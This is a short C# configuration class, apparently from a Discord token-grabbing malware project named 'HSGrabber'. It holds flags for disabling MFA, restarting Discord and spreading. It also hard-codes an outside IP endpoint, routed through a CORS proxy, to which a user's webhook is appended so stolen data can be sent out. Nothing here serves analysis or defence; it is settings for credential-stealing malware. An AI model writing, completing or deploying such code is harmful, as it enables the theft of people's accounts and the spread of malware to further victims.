using System;

namespace HSGrabber
{
	internal class Settings
	{
		public static bool disableMfa = false;

		public static bool restartDiscord = true;

		public static bool spread = true;

		private static string serverurl = "http://62.4.16.141/api/v1/send?webhook=yourwebhook"; // keep API url

		public static string Url = "https://cors-anywhere2.herokuapp.com/" + serverurl;
	}
}
